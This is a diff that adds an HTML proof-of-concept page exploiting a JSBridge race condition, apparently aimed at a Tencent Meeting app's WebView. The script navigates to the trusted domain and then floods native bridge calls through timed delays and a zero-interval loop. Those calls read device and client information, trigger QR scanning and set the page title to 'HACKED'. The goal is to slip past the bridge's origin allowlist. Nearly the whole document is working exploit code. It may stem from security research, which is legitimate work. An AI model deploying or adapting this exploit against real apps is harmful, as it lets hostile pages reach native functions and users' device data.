@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>Race PoC v6</title></head>
+<body>
+<h2>JSBridge Race Condition PoC</h2>
+<pre id="log" style="font-size:10px;max-height:90vh;overflow:auto;"></pre>
+<script>
+var log = document.getElementById('log');
+function addLog(s) { log.textContent += '[' + Date.now() + '] ' + s + '\n'; }
+
+var callCount = 0;
+function callJSBridge(module, method, param) {
+    callCount++;
+    var callId = module + '_' + method + '_' + callCount + '_' + Date.now();
+    var cbName = 'cb_' + callId.replace(/[^a-zA-Z0-9_]/g, '_');
+    window[cbName] = function(jsonStr) {
+        addLog('<<< ' + method + ': ' + (typeof jsonStr === 'string' ? jsonStr.substring(0, 300) : ''));
+    };
+    var req = { callback: cbName, module: module, method: method, param: param || {}, callId: callId };
+    window.JSCallJavaMgr.JSCallNative(JSON.stringify(req));
+}
+
+function doRace() {
+    if (!window.JSCallJavaMgr) { addLog('ERROR: JSCallJavaMgr not found!'); return; }
+    addLog('=== Race PoC ===');
+    addLog('URL: ' + location.href);
+
+    // ====== 方法1: lifecycle-based race ======
+    // 先 navigate 到合法域名（触发 real_time_url 更新）
+    // 然后通过 setTimeout 在旧页面 DOM 未销毁窗口中调用 JSBridge
+    location.href = "https://meeting.tencent.com/";
+
+    // 多个延迟梯度，覆盖不同时间窗口
+    var delays = [0, 50, 100, 150, 200, 300, 500];
+    for (var d = 0; d < delays.length; d++) {
+        (function(delay) {
+            setTimeout(function() {
+                addLog('[delay=' + delay + 'ms] firing JSBridge calls');
+                try {
+                    callJSBridge('DevicePlugin', 'Vibrate', {});
+                    callJSBridge('DevicePlugin', 'CheckUpgrade', {});
+                    callJSBridge('UIPlugin', 'ShowToast', {content:'RACE_' + delay + 'ms', duration:5000, type:0});
+                    callJSBridge('CommonPlugin', 'SetTitle', {title:'HACKED_' + delay});
+                    callJSBridge('DevicePlugin', 'GetClientInfo', {});
+                    callJSBridge('DevicePlugin', 'GetDeviceInfo', {});
+                    callJSBridge('DevicePlugin', 'ScanQrcode', {});
+                } catch(e) {
+                    addLog('[delay=' + delay + 'ms] ERR: ' + e.message);
+                }
+            }, delay);
+        })(delays[d]);
+    }
+
+    // ====== 方法2: setInterval 高频调用 ======
+    // 同时用 setInterval 以最高频率持续调用，覆盖 navigate 过程中的窗口
+    var intervalCount = 0;
+    var iv = setInterval(function() {
+        intervalCount++;
+        try {
+            callJSBridge('DevicePlugin', 'Vibrate', {});
+            callJSBridge('UIPlugin', 'ShowToast', {content:'IV_' + intervalCount, duration:3000, type:0});
+        } catch(e) {
+            clearInterval(iv);
+            addLog('[interval] stopped at #' + intervalCount + ': ' + e.message);
+        }
+        if (intervalCount > 100) clearInterval(iv);
+    }, 0);
+
+    addLog('Race started: navigate + setTimeout + setInterval');
+}
+
+setTimeout(function() {
+    addLog('Starting in 2s...');
+    setTimeout(doRace, 2000);
+}, 500);
+</script>
+</body>
+</html>
